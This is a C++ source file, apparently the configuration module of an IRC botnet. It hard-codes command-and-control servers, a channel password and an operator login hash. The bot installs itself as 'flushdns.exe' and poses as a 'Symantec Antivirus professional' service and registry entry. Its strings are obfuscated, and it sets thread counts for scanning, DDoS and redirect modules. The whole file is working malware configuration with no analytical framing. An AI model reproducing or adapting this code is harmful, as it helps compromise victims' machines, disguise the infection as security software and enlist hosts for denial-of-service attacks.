#include "main.h"
#include "bot.h"
#include "mainctrl.h"
#include "irc.h"

// Set CVAR without description
void CBot::SetCvar(cvar * nun, CString sValue)
{
	g_cMainCtrl.m_cCVar.RegisterCvar(nun, NULL, sValue.CStr(), NULL, false, false, 0);
};

// Set CVAR with description
void CBot::SetCvarD(cvar * nun, CString sDesc, CString sValue)
{
	g_cMainCtrl.m_cCVar.RegisterCvar(nun, sDesc.CStr(), sValue.CStr(), NULL, false, false, 0);
};

void CBot::Config(){
	CString strServer, 
            intPort, strServer2, intPort2, strChannel, strKey,
			strFile, strID, strPrefix, strSIRC, strSFTP, strSHTTP, strSPMS, 
			strSVULN, strLoginN, strLoginP, strLoginH, strLoginI, strRegKey, 
			intTimeout, strServPass, strServ2Pass, strCmdPrefix, 
			strServName,intThreadsREDIR, intThreadsSCAN, intThreadsDDOS,
			intSocketsSCAN, strScanChannel, boolTrue, boolFalse;

	strServer		= "sajnos.myip.hu";
	intPort			= "4212";
	strServPass		= "pimp";

	strServer2		= "neurit.myip.hu";
	intPort2		= intPort;
	strServ2Pass	= "pimp";

	// Bot Channels
	strChannel		= "##forbotz";
/*	strSIRC			= dp(55,16,23,14,81,9,18,3,0);
	strSFTP			= dp();
	strSHTTP		= dp();
	strSVULN		= dp();
	strSPMS			= dp();*/
	strScanChannel	= "##forbotz";
	strKey			= "ForVNCNETAPIASN";
	strFile			= "flushdns.exe";
	strID			= "FlushDNS1.1.0"; 
	strPrefix		= "FXC-";	
	strLoginN		= "billgates";

	strLoginP		= "5F532A3FC4F1EA403F37070F59A7A53A";
	strLoginH		= "localhost";
	strLoginI		= "lol";
	strRegKey		= "Symantec Antivirus professional"; // Win32 USB2 Driver
	
	intTimeout		= "999999";					
	strServName		= "Symantec Antivirus professional";
	strCmdPrefix	= ".";						
	intThreadsREDIR = dp(69,70,76,0);				
	intThreadsDDOS  = dp(70,73,74,0);				
	intThreadsSCAN  = dp(74,68,68,0);				
	intSocketsSCAN	= dp(69,68,70,72,0);			
	boolTrue		= dp(20,18,21,5,0);				
	boolFalse		= dp(6,1,12,19,5,0);			

	// Root Server
	SetCvarD(&m_isServerRoot.si_chanpass,	dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,3,8,1,14,16,1,19,19,0).CStr(),			strKey.CStr());
	SetCvarD(&m_isServerRoot.si_mainchan,	dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,13,1,9,14,3,8,1,14,0).CStr(),			strChannel.CStr());
	SetCvarD(&m_isServerRoot.si_port,		dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,16,15,18,20,0).CStr(),					intPort.CStr());
	SetCvarD(&m_isServerRoot.si_server,		dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,19,5,18,22,5,18,0).CStr(),				strServer.CStr());
	SetCvarD(&m_isServerRoot.si_nickprefix,	dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,14,9,3,11,16,18,5,6,9,24,0).CStr(),	strPrefix.CStr());
	SetCvarD(&m_isServerRoot.si_servpass,	dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,19,5,18,22,16,1,19,19,0).CStr(),		strServPass.CStr());
	SetCvarD(&m_isServerRoot.si_usessl,		dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,21,19,5,63,19,19,12,0).CStr(),			boolFalse.CStr());
	g_cMainCtrl.m_cIRC.m_vServers.push_back(&m_isServerRoot);


	// Backup Server
	SetCvarD(&m_isServer0.si_chanpass,		dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,3,8,1,14,16,1,19,19,0).CStr(),	 		strKey.CStr());
	SetCvarD(&m_isServer0.si_mainchan,		dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,13,1,9,14,3,8,1,14,0).CStr(),			strChannel.CStr());
	SetCvarD(&m_isServer0.si_port,			dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,16,15,18,20,0).CStr(),					intPort2.CStr());
	SetCvarD(&m_isServer0.si_server,		dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,19,5,18,22,5,18,0).CStr(),				strServer2.CStr());
	SetCvarD(&m_isServer0.si_nickprefix,	dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,14,9,3,11,16,18,5,6,9,24,0).CStr(),	strPrefix.CStr());
	SetCvarD(&m_isServer0.si_servpass,		dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,19,5,18,22,16,1,19,19,0).CStr(),		strServ2Pass.CStr());
	SetCvarD(&m_isServer0.si_usessl,		dp(19,9,63,19,5,18,22,5,18,63,18,15,15,20,78,21,19,5,63,19,19,12,0).CStr(),			boolFalse.CStr());
	g_cMainCtrl.m_cIRC.m_vServers.push_back(&m_isServer0);

	g_cMainCtrl.m_sNameVerStr.Format("");

	CString intCSFPort,intRandFTP; 
	intCSFPort.Format("%d", brandom(1337, 22226));
	intRandFTP.Format("%d", brandom(1337, 22226)); 

	SetCvar(&as_enabled,			boolTrue);
	SetCvar(&as_service,			boolTrue);

//	SetCvar(&sniffer_enabled,		boolFalse);
//	SetCvar(&speedtest_enabled,		boolTrue);
//	SetCvar(&scanner_enabled,		boolTrue);
	SetCvar(&secure_enabled,		boolTrue);

	SetCvar(&bot_seclogin,			boolFalse);
	SetCvar(&bot_compnick,			boolFalse);
	SetCvar(&bot_meltserver,		boolTrue);
	SetCvar(&bot_topiccmd,			boolTrue);
	SetCvar(&csendfileftp_show,		boolTrue);
	SetCvar(&identd_enabled,		boolFalse);
	
	SetCvar(&bot_ftrans_port_ftp,	intRandFTP);
	SetCvar(&bot_timeout,			intTimeout);
	SetCvar(&as_valname,			strRegKey);
	SetCvar(&as_service_name,		strServName);
	SetCvar(&scan_maxthreads,		intThreadsSCAN);
	SetCvar(&scan_channel,			strScanChannel);

/*	SetCvar(&vuln_channel,			strSVULN);
	SetCvar(&httpv_channel,			strSHTTP);
	SetCvar(&ftpv_channel,			strSFTP);
	SetCvar(&ircv_channel,			strSIRC);
	SetCvar(&pms_channel,			strSPMS);*/
	//SetCvar(&ddos_maxthreads,		intThreadsDDOS);
	//SetCvar(&redir_maxthreads,		intThreadsREDIR);

	SetCvar(&bot_version,			g_cMainCtrl.m_sNameVerStr);
	SetCvar(&bot_filename,			strFile);
	SetCvar(&bot_id,				strID);
	SetCvar(&bot_prefix,			strCmdPrefix);
	SetCvar(&bot_ftrans_port,		intCSFPort);

	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_chanpass, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_chanpass.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_mainchan, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_mainchan.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_nickprefix, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_nickprefix.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_port, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_port.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_server, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_server.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_servpass, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_servpass.sValue.CStr());
	g_cMainCtrl.m_cCVar.SetCVar(&g_cMainCtrl.m_cBot.si_usessl, g_cMainCtrl.m_cIRC.m_vServers.at(0)->si_usessl.sValue.CStr());

	
	// Login System
	g_cMainCtrl.m_cMac.AddUser(
		strLoginN.CStr(),		// Login Name
		strLoginP.CStr(),		// Login Password (MD5 Upper-Case)
		strLoginH.CStr(),		// Login Hostmask
		strLoginI.CStr()		// Login Ident
	);

}

